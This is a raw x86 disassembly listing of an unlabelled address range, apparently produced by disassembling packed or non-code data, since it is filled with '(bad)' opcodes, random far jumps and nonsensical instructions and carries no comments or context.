  414d36:	out    0xdd,al
  414d38:	adc    eax,0x7acdef43
  414d3d:	xchg   ecx,eax
  414d3e:	mov    dh,0x29
  414d40:	sbb    BYTE PTR [edx-0x2b],bh
  414d43:	mov    bh,0x42
  414d45:	sbb    DWORD PTR [eax],ebx
  414d47:	inc    ecx
  414d48:	aam    0x19
  414d4a:	in     eax,dx
  414d4b:	pop    esi
  414d4c:	jno    0x414d6a
  414d4e:	jne    0x414ce6
  414d50:	sti    
  414d51:	dec    ebx
  414d52:	in     eax,dx
  414d53:	mov    WORD PTR [eax+0x52],cs
  414d56:	int3   
  414d57:	(bad)  
  414d58:	or     DWORD PTR [edx-0x5a6da98f],edi
  414d5e:	loopne 0x414ce7
  414d60:	callw  0xaaaf
  414d64:	mul    BYTE PTR [eax+0x23]
  414d67:	retf   
  414d68:	outs   dx,DWORD PTR ds:[esi]
  414d69:	fild   QWORD PTR [edi-0x26bfa006]
  414d6f:	arpl   WORD PTR [esi+eax*1],si
  414d72:	inc    esi
  414d73:	popa   
  414d74:	jecxz  0x414d3a
  414d76:	pop    edx
  414d77:	jne    0x414d78
  414d79:	pop    ds
  414d7a:	add    ah,BYTE PTR [edi-0x46]
  414d7d:	sbb    DWORD PTR [ecx+0x7cbc44d6],0xf5bcab40
  414d87:	leave  
  414d88:	jecxz  0x414d37
  414d8a:	pushf  
  414d8b:	mov    ds:0xa95d6668,eax
  414d90:	xchg   DWORD PTR [edx+edi*2+0x7dc71d8e],edx
  414d97:	push   esi
  414d98:	test   al,0xa9
  414d9a:	mov    edi,0x9957de3
  414d9f:	out    dx,al
  414da0:	sbb    al,0x58
  414da2:	xor    BYTE PTR ds:0x95edab03,dl
  414da8:	fld    QWORD PTR [edx]
  414daa:	and    edi,DWORD PTR [eax-0x6e]
  414dad:	(bad)  
  414dae:	sub    edi,edx
  414db0:	(bad)  
  414db2:	addr16 xor eax,0xc0d8c20d
  414db8:	and    edx,DWORD PTR [edx+ecx*4-0x70]
  414dbc:	dec    ecx
  414dbd:	arpl   WORD PTR [edi+0x6212c4ff],di
  414dc3:	mov    eax,ecx
  414dc5:	out    0x5a,eax
  414dc7:	jmp    0xa042:0xaa35e989
  414dce:	mov    ?,WORD PTR [esi-0x59]
  414dd1:	or     DWORD PTR [ecx+ebp*4],ecx
  414dd4:	rcl    esp,1
  414dd6:	loope  0x414dda
  414dd8:	test   esi,0xde15f555
  414dde:	inc    eax
  414ddf:	(bad)  
  414de0:	jle    0x414d80
  414de2:	mov    bl,0xf7
  414de4:	add    ecx,DWORD PTR [eax+0xe80113]
  414dea:	cmc    
  414deb:	ror    BYTE PTR [eax-0x10],cl
  414dee:	or     al,0xb9
  414df0:	(bad)  
  414df1:	push   cs
  414df2:	js     0x414e35
  414df4:	xor    cl,dl
  414df6:	mov    ch,0xc5
  414df8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414dfa:	pop    eax
  414dfb:	and    BYTE PTR [edx],0x43
  414dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dff:	push   edx
  414e00:	jo     0x414db4
  414e02:	outs   dx,BYTE PTR ds:[esi]
  414e03:	sar    BYTE PTR [esi],1
  414e05:	jmp    0x4897:0x4af382c5
  414e0c:	mov    eax,edi
  414e0e:	test   eax,0x1d5e32a3
  414e13:	jmp    0x414e2d
  414e15:	mov    dl,0x98
  414e17:	cli    
  414e18:	sub    cl,cl
  414e1a:	retf   
  414e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1c:	mov    edx,0xe911de50
  414e21:	xchg   ebx,eax
  414e22:	(bad)  
  414e23:	and    al,0x5d
  414e25:	pop    edi
  414e26:	pop    ebp
  414e27:	cmp    eax,0x1752af07
  414e2c:	(bad)  
  414e2d:	push   ebx
  414e2e:	pop    ds
  414e2f:	add    BYTE PTR [ebx],dh
  414e31:	jno    0x414ea7
  414e33:	inc    eax
  414e34:	repz jmp 0xe805f4a0
  414e3a:	(bad)  
  414e3b:	cmc    
  414e3c:	add    eax,0x5607d4a6
  414e41:	stos   BYTE PTR es:[edi],al
  414e42:	test   BYTE PTR [eax-0x4a],cl
  414e45:	outs   dx,BYTE PTR ds:[esi]
  414e46:	loop   0x414dd9
  414e48:	fisubr DWORD PTR fs:0xee381545
  414e4f:	and    al,0x82
  414e51:	add    edx,0x33f71863
  414e57:	adc    al,0x52
  414e59:	imul   ebx,esp,0x76e2271
  414e5f:	fcom   DWORD PTR [ebp-0x625c1e1f]
  414e65:	add    ah,ah
  414e67:	pop    esp
  414e68:	push   DWORD PTR [esp+esi*2+0x564def58]
  414e6f:	push   eax
  414e70:	lods   eax,DWORD PTR ds:[esi]
  414e71:	mov    edi,0xac53bca5
  414e76:	or     bh,BYTE PTR fs:[eax+0x76]
  414e7a:	mov    cl,0xea
  414e7c:	mov    edx,0x20fa8876
  414e81:	call   0x7f8a:0x620fcf36
  414e88:	cld    
  414e89:	pop    eax
  414e8a:	or     dh,ah
  414e8c:	es add al,0x3a
  414e8f:	dec    esp
  414e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e91:	lock mov dh,0x42
  414e94:	dec    ebx
  414e95:	push   esi
  414e96:	mov    edi,0xc44f3585
  414e9b:	int    0x39
  414e9d:	daa    
  414e9e:	dec    ebx
  414e9f:	push   ecx
  414ea0:	mov    al,0x7b
  414ea2:	and    esi,DWORD PTR [ebx]
  414ea4:	adc    ecx,ebx
  414ea6:	lods   eax,DWORD PTR ds:[esi]
  414ea7:	cs addr16 inc ecx
  414eaa:	test   eax,0xc8ad8756
  414eaf:	pop    eax
  414eb0:	add    BYTE PTR [esi],bl
  414eb2:	or     BYTE PTR [eax+0x47580e4a],0x8b
  414eb9:	aam    0x49
  414ebb:	xlat   BYTE PTR ds:[ebx]
  414ebc:	mov    esp,0xa1c40330
  414ec1:	in     eax,dx
  414ec2:	aam    0x45
  414ec4:	stos   BYTE PTR es:[edi],al
  414ec5:	dec    esi
  414ec6:	adc    al,0x24
  414ec8:	shr    BYTE PTR [ecx],1
  414eca:	mov    edx,DWORD PTR [eax]
  414ecc:	retf   0x2542
  414ecf:	and    eax,0xf4fcc70
  414ed4:	std    
  414ed5:	mov    dl,0x42
  414ed7:	int3   
  414ed8:	adc    ecx,eax
  414eda:	scas   eax,DWORD PTR es:[edi]
  414edb:	(bad)  
  414edc:	mov    ss,esp
  414ede:	xchg   edi,eax
  414edf:	pop    ecx
  414ee0:	and    eax,0x56afa68c
  414ee5:	and    bl,BYTE PTR [ebp+0x2160622]
  414eeb:	and    ebx,DWORD PTR [eax+eax*2-0x66]
  414eef:	ffree  st(2)
  414ef1:	popf   
  414ef2:	adc    al,0xb2
  414ef4:	shr    ebp,0x4d
  414ef7:	leave  
  414ef8:	jne    0x414eb1
  414efa:	fs aam 0x9
  414efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414efe:	rcr    BYTE PTR [ebp+0x39e913a0],cl
  414f04:	xchg   esi,eax
  414f05:	ror    esi,1
  414f07:	push   ss
  414f08:	add    DWORD PTR [eax-0x4a],edi
  414f0b:	cmp    DWORD PTR [ebx+0x3e],esi
  414f0e:	cli    
  414f0f:	cdq    
  414f10:	(bad)  
  414f11:	es jmp 0x414eb2
  414f14:	dec    edx
  414f15:	mov    ebp,0x685ae833
  414f1a:	sub    DWORD PTR [edx+0x1478c704],0x5476c21
  414f24:	xchg   edx,eax
  414f25:	and    al,0x81
  414f27:	or     bh,BYTE PTR [edi]
  414f29:	das    
  414f2a:	call   0x59bc:0x2a84027b
  414f31:	enter  0x6029,0x35
  414f35:	cmp    eax,DWORD PTR [eax]
  414f37:	mov    ds:0x5ae349ac,eax
  414f3c:	retf   0xd4b4
  414f3f:	xchg   ecx,eax
  414f40:	or     BYTE PTR [ebx+ebp*1+0x5b],dl
  414f44:	outs   dx,BYTE PTR ds:[esi]
  414f45:	imul   edi,esi,0xffffff8c
  414f48:	pop    esi
  414f49:	(bad)  
  414f4a:	jp     0x414f25
  414f4c:	xor    ebx,ebp
  414f4e:	ret    
  414f4f:	add    esp,DWORD PTR [edx+0x22]
  414f52:	adc    al,0xc1
  414f54:	add    ch,BYTE PTR [ebp+0x740391f9]
  414f5a:	mov    bh,0xd3
  414f5c:	cdq    
  414f5d:	jae    0x414f82
  414f5f:	out    dx,al
  414f60:	sub    DWORD PTR [eax-0x2014e732],ebp
  414f66:	push   es
  414f67:	push   ebp
  414f68:	pop    edx
  414f69:	pop    ecx
  414f6a:	arpl   sp,bx
  414f6c:	sbb    BYTE PTR [edi+eax*1+0x51578897],bh
  414f73:	or     BYTE PTR [esi+0x7d3b6859],dl
  414f79:	xchg   ebx,eax
  414f7a:	xchg   ebx,eax
  414f7b:	rol    BYTE PTR [edx-0x71955e91],cl
  414f81:	add    ebx,DWORD PTR [ebx-0x30]
  414f84:	sub    eax,DWORD PTR [edx-0x57672794]
  414f8a:	cmp    eax,0x6d6252ec
  414f8f:	sti    
  414f90:	pop    edi
  414f91:	cmp    DWORD PTR [edi],eax
  414f93:	cmp    eax,0x63b3f612
  414f98:	mov    edx,0x278dbf3
  414f9d:	mov    edx,0xe0ff6920
  414fa2:	mov    eax,0x56928b01
  414fa7:	call   0xe667:0x1a5bf450
  414fae:	add    bh,bh
  414fb0:	cmp    BYTE PTR [ebx+0x6a45d9f0],al
  414fb6:	cmp    dh,BYTE PTR [eax+edx*1+0x52]
  414fba:	out    0xe,al
  414fbc:	shl    DWORD PTR [esi-0x38191750],1
  414fc2:	push   cs
  414fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fc4:	add    eax,0x7b3d938d
  414fc9:	jg     0x415018
  414fcb:	lock out 0x68,eax
  414fce:	(bad)  
  414fd0:	mov    ds:0xccf7fa01,al
  414fd5:	lock fisub WORD PTR [edi]
  414fd8:	(bad)  
  414fdc:	mov    al,0x43
  414fde:	jmp    0xe6a:0x7191fc51
  414fe5:	cmp    ecx,ecx
  414fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe8:	stc    
  414fe9:	sub    DWORD PTR [ebx+0x51],edi
  414fec:	xchg   edx,eax
  414fed:	push   es
  414fee:	(bad)
  414ff1:	popf   
  414ff2:	pop    ecx
  414ff3:	cmc    
  414ff4:	xchg   ebp,eax
  414ff5:	in     eax,0x8c
  414ff7:	rol    DWORD PTR [ebx+0x5e],cl
  414ffa:	gs (bad) 
  414ffc:	les    eax,FWORD PTR [edx-0x6648f853]
  415002:	jle    0x415018
  415004:	mov    esi,0xe7dccad3
  415009:	adc    esp,DWORD PTR [esi+0x49992098]
  41500f:	addr16 mov ebp,0xfc514d99
  415015:	sbb    DWORD PTR [edi+0x0],ecx
  415018:	scas   eax,DWORD PTR es:[edi]
  415019:	or     DWORD PTR [ebp+0x7f],0x3e
  41501d:	imul   edx
  41501f:	inc    ebp
  415020:	mov    dh,0xb
  415022:	(bad)  
  415023:	cmc    
  415024:	cmp    DWORD PTR [ecx+0xc],eax
  415027:	and    ecx,ecx
  415029:	mov    BYTE PTR [eax-0x64d59b7],0x92
  415030:	les    eax,FWORD PTR ds:0x585d1e41
  415036:	ins    BYTE PTR es:[edi],dx
  415037:	repnz adc DWORD PTR [ebx+ecx*4+0x45],edx
  41503c:	mov    edi,0xd41182f3
  415041:	into   
  415042:	sbb    eax,0xc1986ca0
  415047:	push   edi
  415048:	ficom  DWORD PTR [esi-0x29bd2093]
  41504e:	xlat   BYTE PTR ds:[ebx]
  41504f:	push   0x4034a698
  415054:	imul   esi,DWORD PTR [ebp+0x3587fdf7],0x1a
  41505b:	adc    ebx,edx
  41505d:	push   ebp
  41505e:	cmp    al,BYTE PTR [ecx]
  415060:	sub    eax,0x55c90ba0
  415065:	call   0xd74f:0x20ca5857
  41506c:	pusha  
  41506d:	sub    ecx,eax
  41506f:	push   edx
  415070:	mov    ?,WORD PTR [edx+edi*2+0x65a818a3]
  415077:	arpl   WORD PTR [edx],si
  415079:	(bad)  
  41507a:	repnz xor al,BYTE PTR [eax+esi*1-0x27]
  41507f:	sub    esi,DWORD PTR ss:[ecx-0x35]
  415083:	scas   eax,DWORD PTR es:[edi]
  415084:	mov    eax,0x62d51c1c
  415089:	test   eax,0xc0b2c621
  41508e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  415090:	out    dx,eax
  415091:	pop    ss
  415092:	push   0xfffffff3
  415094:	repnz stos BYTE PTR es:[edi],al
  415096:	sub    eax,0xf7a48784
  41509b:	mov    bh,BYTE PTR ds:0xa2eaa0c6
  4150a1:	jl     0x41507a
  4150a3:	mov    esp,0x587f7d5
  4150a8:	test   DWORD PTR [edi+eiz*4],ecx
  4150ab:	xor    eax,0xac26e477
  4150b0:	dec    ebx
  4150b1:	add    eax,0x56ab9ce9
  4150b6:	hlt    
  4150b7:	sahf   
  4150b8:	push   ebx
  4150b9:	addr16 and eax,0xc15d2a9e
  4150bf:	call   0x2ef1859f
  4150c4:	and    BYTE PTR [ebx-0x20f08944],cl
  4150ca:	jnp    0x415142
  4150cc:	cmp    al,0x6f
  4150ce:	sub    DWORD PTR [esi-0x59db31c2],eax
  4150d4:	rcr    edi,cl
  4150d6:	mov    esp,0xd4c2e532
  4150db:	or     edi,DWORD PTR [ecx-0x726ad292]
  4150e1:	mov    edi,edx
  4150e3:	das    
  4150e4:	add    BYTE PTR [edx],dh
  4150e6:	xchg   esp,eax
  4150e7:	or     al,0xc2
  4150e9:	imul   esi,DWORD PTR [ebx],0xdefd3999
  4150ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150f0:	dec    ebx
  4150f1:	mov    bl,0xc5
  4150f3:	(bad)  
  4150f4:	mov    edi,0xc609ddda
  4150f9:	pop    edx
  4150fa:	inc    ebx
  4150fb:	mov    esp,0x519566a
  415100:	stos   BYTE PTR es:[edi],al
  415101:	sbb    al,cl
  415103:	mov    ?,edi
  415105:	inc    BYTE PTR [esi+eax*1]
  415108:	xchg   ecx,eax
  415109:	imul   BYTE PTR [eax-0x49]
  41510c:	rcl    BYTE PTR [edi+0x65],1
  41510f:	and    ebp,DWORD PTR [ebx+0x48]
  415112:	pop    ebx
  415113:	je     0x415159
  415115:	hlt    
  415116:	sahf   
  415117:	sahf   
  415118:	dec    ebp
  415119:	in     al,0x44
  41511b:	(bad)  
  41511c:	pop    esi
  41511d:	mov    edx,0x561ffeed
  415122:	push   es
  415123:	je     0x4150ea
  415125:	lods   al,BYTE PTR ds:[esi]
  415126:	jnp    0x4150b8
  415128:	das    
  415129:	aas    
  41512a:	push   ebp
  41512b:	pushf  
  41512c:	pop    ds
  41512d:	std    
  41512e:	outs   dx,BYTE PTR ds:[esi]
  41512f:	mov    ebp,0xffb0ab22
  415134:	cmp    ebx,DWORD PTR [edi-0x28]
  415137:	dec    esp
  415138:	in     eax,dx
  415139:	(bad)  
  41513a:	jmp    0x647b:0x606489a9
  415141:	dec    edi
  415142:	(bad)  
  415143:	idiv   DWORD PTR [eax-0x5ffe5ee3]
  415149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41514a:	pusha  
  41514b:	gs xchg ecx,eax
  41514d:	retf   0x60ab
  415150:	mov    esi,0xc1bbbfa7
  415155:	push   ebx
  415156:	lock jg 0x415163
  415159:	or     esp,DWORD PTR [ebx+edi*4+0x17c8f66e]
  415160:	and    eax,0x9b759389
  415165:	inc    esi
  415166:	fmul   st(4),st
  415168:	dec    ebp
  415169:	jle    0x41517a
  41516b:	jmp    0x9d77dc3a
  415170:	lea    edi,[ecx]
  415172:	fisubr DWORD PTR [esi]
  415174:	ror    bh,0xb6
  415177:	ins    DWORD PTR es:[di],dx
  415179:	imul   ecx,esp,0x5b
  41517c:	pop    es
  41517d:	iret   
  41517e:	outs   dx,BYTE PTR ds:[esi]
  41517f:	or     eax,0x8ecd2903
  415184:	jae    0x415192
  415186:	and    ebx,ebp
  415188:	mov    bl,ch
  41518a:	sub    ah,BYTE PTR [ebp+0x5895f5c4]
  415190:	mov    bh,0x4d
  415192:	pusha  
  415193:	fcomp  DWORD PTR [edx+0xf]
  415196:	adc    DWORD PTR [eax+ecx*4-0x5],ecx
  41519a:	mov    esi,0xf5c112b2
  41519f:	cmp    al,BYTE PTR [esi+0x65fdd1d4]
  4151a5:	sub    edi,esi
  4151a7:	es dec edx
  4151a9:	stc    
  4151aa:	ror    BYTE PTR [esi],cl
  4151ac:	dec    esi
  4151ad:	cmp    BYTE PTR [ebx],0xf4
  4151b0:	mov    cl,0xeb
  4151b2:	pop    edi
  4151b3:	int    0x99
  4151b5:	sbb    bh,BYTE PTR [ebp+0x501ecdbd]
  4151bb:	icebp  
  4151bc:	mov    al,0x60
  4151be:	int    0xeb
  4151c0:	adc    dl,BYTE PTR [ebp-0x4e38a836]
  4151c6:	dec    eax
  4151c7:	fst    QWORD PTR [edi+0x6e]
  4151ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151cb:	cmp    al,0x26
  4151cd:	push   ecx
  4151ce:	out    dx,al
  4151cf:	(bad)  
  4151d0:	iret   
  4151d1:	addr16 dec eax
  4151d3:	(bad)  [ebp-0x4f]
  4151d6:	fimul  WORD PTR [ebx-0x4e3142fc]
  4151dc:	pushf  
  4151dd:	loop   0x41516d
  4151df:	push   eax
  4151e0:	add    esi,ecx
  4151e2:	lds    ebx,FWORD PTR [edx]
  4151e4:	cld    
  4151e5:	cmc    
  4151e6:	mov    bh,0xb
  4151e8:	push   0xffffffc4
  4151ea:	or     ebp,ecx
  4151ec:	retf   
  4151ed:	mov    bl,bh
  4151ef:	test   DWORD PTR [ebx-0x4e113e0e],0xda65542b
  4151f9:	stos   BYTE PTR es:[edi],al
  4151fa:	inc    ebp
  4151fb:	cmp    eax,0x831eddfe
  415200:	rol    DWORD PTR [edx+edi*1+0x43],cl
  415204:	and    al,BYTE PTR [esi]
  415206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415207:	sbb    eax,0x6af9f5f3
  41520c:	jno    0x415197
  41520e:	jno    0x4151d5
  415210:	fbstp  TBYTE PTR [ebx+0x8974313]
  415216:	push   ss
  415217:	pop    esi
  415218:	ja     0x4151be
  41521a:	pop    esp
  41521b:	push   0x6c
  41521d:	xor    eax,esi
  41521f:	sti    
  415220:	xor    al,0x59
  415222:	cmp    DWORD PTR [edi+0x5f],eax
  415225:	mov    BYTE PTR [eax+ecx*2],bl
  415228:	lea    ecx,[eax-0x2f]
  41522b:	aam    0x50
  41522d:	lock call 0x8c1ea806
  415233:	mov    esp,0xceabecf6
  415238:	xor    edi,esi
  41523a:	xor    al,0xfd
  41523c:	fs mov edi,0xcedab7d5
  415242:	sub    dl,BYTE PTR [ebp-0x612f2c85]
  415248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415249:	mov    dh,0x38
  41524b:	xor    dl,BYTE PTR [edi]
  41524d:	jae    0x4151f0
  41524f:	lea    ecx,[esi]
  415251:	add    BYTE PTR [eax+eiz*8],dl
  415254:	inc    esi
  415255:	fwait
  415256:	push   es
  415257:	push   esi
  415258:	in     al,dx
  415259:	xchg   ebp,eax
  41525a:	stos   DWORD PTR es:[edi],eax
  41525b:	mov    esi,0xd5ab2c41
  415260:	sar    DWORD PTR [esi-0x6],1
  415263:	mov    BYTE PTR [ebp-0x5],ch
  415266:	jmp    0x66ba:0x28e62ac8
  41526d:	xor    al,0xfb
  41526f:	aas    
  415270:	add    DWORD PTR [eax+0x27d4c23f],esp
  415276:	inc    ebx
  415277:	mov    DWORD PTR [esi-0x5d861196],ecx
  41527d:	xor    BYTE PTR [esi],al
  41527f:	inc    ebp
  415280:	pop    edi
  415281:	mov    bh,0x6e
  415283:	jo     0x415216
  415285:	xor    cl,BYTE PTR [ecx+0x30]
  415288:	inc    edx
  415289:	cs sbb al,0xa9
  41528c:	xor    BYTE PTR [edx],ah
  41528e:	sbb    eax,ebx
  415290:	mov    al,ds:0x2dbeba84
  415295:	ins    BYTE PTR es:[edi],dx
  415296:	push   ebp
  415297:	push   esp
  415298:	mov    eax,ds:0x749c40d9
  41529d:	mov    ebx,0xc8b67f99
  4152a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a3:	popf   
  4152a4:	dec    ebp
  4152a5:	call   0xd8a:0x6e41e6f7
  4152ac:	test   eax,0xa6d0b7b4
  4152b1:	mov    ebx,0x7eb1721e
  4152b6:	lea    ecx,[eax]
  4152b8:	jb     0x41528b
  4152ba:	ret    
  4152bb:	in     eax,0x43
  4152bd:	mov    dh,0x95
  4152bf:	mov    ebx,0xf110cde5
  4152c4:	fimul  DWORD PTR [ebx]
  4152c6:	gs dec esp
  4152c8:	mov    al,ds:0x79120186
  4152cd:	das    
  4152ce:	imul   edx,DWORD PTR [esi+edi*2+0x31344e25],0xffffffb9
  4152d6:	in     al,0x9b
  4152d8:	fcmove st,st(3)
  4152da:	imul   ebx,DWORD PTR [edx-0x5a],0xffffff9c
  4152de:	js     0x41530c
  4152e0:	sbb    BYTE PTR [ebp+0xe],bh
  4152e3:	pop    edi
  4152e4:	sbb    al,0x21
  4152e6:	out    0xcb,al
  4152e8:	or     DWORD PTR [edi],eax
  4152ea:	push   ss
  4152eb:	mov    ?,esi
  4152ed:	js     0x41535b
  4152ef:	sar    DWORD PTR ds:0xff5ee86f,1
  4152f5:	fnsave [esi+0x7615cf81]
  4152fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152fc:	rcr    DWORD PTR [ecx+0x1e],1
  4152ff:	fcom   st(0)
  415301:	arpl   WORD PTR [ebp+0x43],bp
  415304:	push   cs
  415305:	mov    BYTE PTR [edi-0x6719e064],ch
  41530b:	cmp    DWORD PTR [ecx+esi*8-0x7f],ecx
  41530f:	(bad)  
  415310:	in     al,dx
  415311:	retf   0xf8a9
  415314:	inc    edi
  415315:	ret    
  415316:	push   cs
  415317:	fwait
  415318:	mov    al,0xab
  41531a:	add    edx,DWORD PTR [ecx]
  41531c:	mov    ds:0xe94c0089,eax
  415321:	mov    ?,WORD PTR [edx+0x4d1e3c8d]
  415327:	sub    DWORD PTR [ebp+0x6fd4a3f4],eax
  41532d:	fwait
  41532e:	jle    0x415362
  415330:	pop    ebx
  415331:	and    DWORD PTR [esi+0x905cbee],edx
  415337:	jmp    0x31d72ca0
  41533c:	dec    edi
  41533d:	inc    esp
  41533e:	or     BYTE PTR [ecx],ah
  415340:	inc    esi
  415341:	(bad)  
  415344:	jl     0x415398
  415346:	jne    0x415320
  415348:	dec    edi
  415349:	jmp    0x626110e7
  41534e:	dec    ebp
  41534f:	rcl    BYTE PTR [eax],cl
  415351:	mov    bl,0x37
  415353:	inc    edi
  415354:	into   
  415355:	mov    ch,BYTE PTR [ebx]
  415357:	(bad)  
  415358:	out    dx,al
  415359:	dec    edi
  41535a:	(bad)  
  41535b:	cmc    
  41535c:	out    0xd1,eax
  41535e:	fs fnstsw ax
  415361:	sub    DWORD PTR [ecx-0x3de43eea],esp
  415367:	pop    edx
  415369:	pusha  
  41536a:	cdq    
  41536b:	lock stc 
  41536d:	jno    0x415331
  41536f:	add    edx,edi
  415371:	out    dx,al
  415372:	jno    0x41533d
  415374:	pop    ebp
  415375:	cwde   
  415376:	xor    BYTE PTR [ebp+0x53],dl
  415379:	pop    ds
  41537a:	mov    ah,al
  41537c:	xor    eax,0x642fd69a
  415381:	in     al,dx
  415382:	data16 sub al,0xf5
  415385:	in     eax,dx
  415386:	pop    es
  415387:	sbb    al,0x74
  415389:	pop    DWORD PTR [eax]
  41538b:	push   edx
  41538c:	mov    ah,0x49
  41538e:	(bad)  
  41538f:	enter  0xf2cc,0x2b
  415393:	and    ch,0x24
  415396:	push   esp
  415397:	dec    ebx
  415398:	call   0x1f37:0x668b1ebb
  41539f:	jp     0x4153d5
  4153a1:	jp     0x4153b2
  4153a3:	mov    ah,0xbd
  4153a5:	in     al,0x4f
  4153a7:	sub    ch,BYTE PTR [ecx-0xc26999f]
  4153ad:	push   ss
  4153ae:	dec    edi
  4153af:	test   eax,0xd69a7d1b
  4153b4:	jp     0x4153a2
  4153b6:	xor    DWORD PTR [esi-0x1146ed83],edi
  4153bc:	sub    eax,0xd5b36f0d
  4153c1:	jle    0x41535f
  4153c3:	mov    esi,0x94d3e48c
  4153c8:	add    BYTE PTR [eax+0x35],cl
  4153cb:	fs out 0xfd,eax
  4153ce:	cmp    eax,0x14e6f954
  4153d3:	fisttp WORD PTR [ebx]
  4153d5:	stos   DWORD PTR es:[edi],eax
  4153d6:	lds    ebp,FWORD PTR [ebp-0x78e57137]
  4153dc:	leave  
  4153dd:	adc    eax,0x845a8478
  4153e2:	inc    ebp
  4153e3:	retf   
  4153e4:	cwde   
  4153e5:	fcmove st,st(4)
  4153e8:	mov    eax,ds:0xcad5bcb2
  4153ed:	fwait
  4153ee:	fwait
  4153ef:	xchg   ecx,eax
  4153f0:	add    eax,0x43a37e9a
  4153f5:	cmc    
  4153f6:	mov    edi,0x5c5bd1b9
  4153fb:	or     DWORD PTR [ebp+0x53a8cb34],edx
  415401:	mov    dl,0x64
  415403:	lock push 0x9f78994d
  415409:	loopne 0x4153bc
  41540b:	ja     0x4153ea
  41540d:	nop
  41540e:	push   ebx
  41540f:	hlt    
  415410:	push   esp
  415411:	cmp    eax,0xf703b806
  415416:	or     ecx,DWORD PTR [ecx-0x3b88fc33]
  41541c:	jle    0x4153c9
  41541e:	jo     0x4153aa
  415420:	dec    esp
  415421:	xchg   edx,eax
  415422:	mov    edx,0xe65e92ba
  415427:	rol    BYTE PTR [edi-0x915bb26],0xcf
  41542e:	dec    esp
  41542f:	sti    
  415430:	int    0x59
  415432:	pop    esp
  415433:	sub    dh,bh
  415435:	loopne 0x415462
  415437:	and    ecx,eax
  415439:	call   0xe02c8da2
  41543e:	or     eax,0x7b9a68e5
  415443:	and    edi,DWORD PTR [edi+ebp*2+0x58a7376a]
  41544a:	in     al,0x89
  41544c:	mov    dl,0xb5
  41544e:	inc    ecx
  41544f:	push   0xffffff84
  415451:	xor    al,al
  415453:	and    eax,0xa43d4d32
  415458:	jle    0x41547f
  41545a:	sbb    BYTE PTR [edi-0x1f2f3342],bh
  415460:	mov    ebp,ebx
  415462:	push   edi
  415463:	pop    esp
  415464:	inc    eax
  415465:	rcr    BYTE PTR [edx+0x38],cl
  415468:	mov    edi,ebp
  41546a:	test   DWORD PTR [ebp+ecx*2-0x7404ede8],edi
  415471:	adc    dh,0x6a
  415474:	xor    al,0xe4
  415476:	(bad)  
  415477:	imul   DWORD PTR [edx-0x5e]
  41547a:	mov    dh,0x2c
  41547c:	adc    ch,BYTE PTR [ebp-0x61]
  41547f:	clc    
  415480:	into   
  415481:	dec    DWORD PTR [ebx-0x1]
  415484:	sub    edx,DWORD PTR [edi+0x3e98fc62]
  41548a:	sbb    eax,DWORD PTR [eax+ebp*1-0x4b]
  41548e:	scas   eax,DWORD PTR es:[edi]
  41548f:	inc    eax
  415490:	repnz mov DWORD PTR [esi-0x530b2d1e],edi
  415497:	lods   eax,DWORD PTR ds:[esi]
  415498:	inc    ebp
  415499:	rol    DWORD PTR [esi-0x2f],1
  41549c:	aas    
  41549d:	mov    BYTE PTR [esi-0x8],dh
  4154a0:	out    0x9b,al
  4154a2:	mov    dh,0xee
  4154a4:	xchg   ebp,eax
  4154a5:	xchg   BYTE PTR [ebp-0x3b208d76],bl
  4154ab:	inc    edx
  4154ac:	dec    ecx
  4154ad:	lock or BYTE PTR [eax-0x7a],dl
  4154b1:	mov    dl,BYTE PTR [edx+0x6c05759b]
  4154b7:	(bad)
  4154ba:	ja     0x41549e
  4154bc:	inc    ebp
  4154bd:	sub    edx,DWORD PTR [ecx-0x278b0df6]
  4154c3:	ins    BYTE PTR es:[edi],dx
  4154c4:	mov    eax,ds:0x7a9e9647
  4154c9:	clc    
  4154ca:	jae    0x4154a4
  4154cc:	mov    esp,0xaddcf0c7
  4154d1:	js     0x4154e6
  4154d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d4:	mov    ebx,0x176fd501
  4154d9:	sub    DWORD PTR [ecx-0x3388e7f],ebp
  4154df:	into   
  4154e0:	push   ebx
  4154e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e2:	push   ebx
  4154e3:	mov    ah,0x76
  4154e5:	mov    esp,DWORD PTR [edx-0x1e]
  4154e8:	imul   esp,DWORD PTR [esi-0x31],0xa897a655
  4154ef:	or     edi,ebp
  4154f1:	ficomp DWORD PTR [esi]
  4154f3:	(bad)  
  4154f4:	adc    al,0x70
  4154f6:	mov    ecx,0x568b9c92
  4154fb:	mov    eax,0x90b5bf91
  415500:	add    bh,bh
  415502:	push   ebp
  415503:	into   
  415504:	neg    BYTE PTR [eax+0x213cc45a]
  41550a:	xor    al,0x37
  41550c:	popf   
  41550d:	or     bh,BYTE PTR [ebp+esi*4-0x619028bc]
  415514:	xchg   esi,eax
  415515:	or     al,0x3
  415517:	mov    dh,0xa6
  415519:	shl    BYTE PTR [ecx+0x1e],cl
  41551c:	push   es
  41551d:	or     BYTE PTR [edi-0x6f0fcf6],ah
  415523:	xchg   edi,eax
  415524:	outs   dx,DWORD PTR ds:[esi]
  415525:	dec    ebp
  415526:	popa   
  415527:	pop    edi
  415528:	ficomp DWORD PTR [ebx+edi*4-0x21]
  41552c:	mov    edx,0xee7f60d6
  415531:	retf   
  415532:	sub    eax,0x4979459
  415537:	jae    0x415526
  415539:	ret    0x3a93
  41553c:	xchg   ebp,eax
  41553d:	dec    edx
  41553e:	sub    eax,0x4c7247fb
  415543:	push   ecx
  415544:	pusha  
  415545:	jl     0x415573
  415547:	adc    al,0x3b
  415549:	jo     0x4155a8
